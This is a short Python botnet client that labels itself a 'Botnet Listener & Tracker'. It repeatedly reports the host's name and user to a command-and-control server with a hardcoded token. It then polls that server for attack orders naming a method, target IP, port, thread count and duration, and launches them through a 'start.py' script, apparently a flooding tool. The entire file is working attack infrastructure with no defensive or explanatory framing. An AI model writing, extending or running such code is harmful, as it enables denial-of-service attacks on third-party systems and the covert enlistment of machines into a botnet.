import requests
import subprocess
import time
import socket
import getpass

API_URL = "https://botnet.gosyntech.in/botnet/?token=wrfn34r9h9B98VK9j"
TRACK_URL = "https://botnet.gosyntech.in/botnet/track_bot/"
POLL_INTERVAL = 2  # seconds

# Get hostname and username once
hostname = socket.gethostname()
username = getpass.getuser()
full_host = f"{hostname}_{username}"

def get_payload():
    try:
        response = requests.get(API_URL, timeout=5)
        return response.json()
    except Exception as e:
        print(f"[ERROR] Failed to fetch payload: {e}")
        return None

def send_tracking():
    try:
        response = requests.get(f"{TRACK_URL}?hostname={full_host}", timeout=5)
        if response.status_code == 200:
            print(f"[TRACKING] Sent: {full_host}")
        else:
            print(f"[TRACKING] Failed ({response.status_code})")
    except Exception as e:
        print(f"[ERROR] Failed to send tracking: {e}")

def run_command(method, ip, port, threads, duration):
    if port == "9999999":
        target = ip
    else:
        target = f"{ip}:{port}"

    command = ["python3", "start.py", method, target, threads, duration]
    print(f"\n[EXECUTING] {' '.join(command)}\n")

    # Run command and show live output
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line, end="")
        process.wait()
    except Exception as e:
        print(f"[ERROR] Failed to run command: {e}")

def main():
    print("🌐 Botnet Listener & Tracker Started.")
    while True:
        send_tracking()
        payload_data = get_payload()

        if payload_data is None:
            time.sleep(POLL_INTERVAL)
            continue

        if "latest_payload" in payload_data:
            payload = payload_data["latest_payload"]
            method = payload["method"]
            ip = payload["ip"]
            port = payload["port"]
            threads = payload["threads"]
            duration = payload["time"]

            run_command(method, ip, port, threads, duration)
        else:
            print("[INFO] No payload. Waiting...")

        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
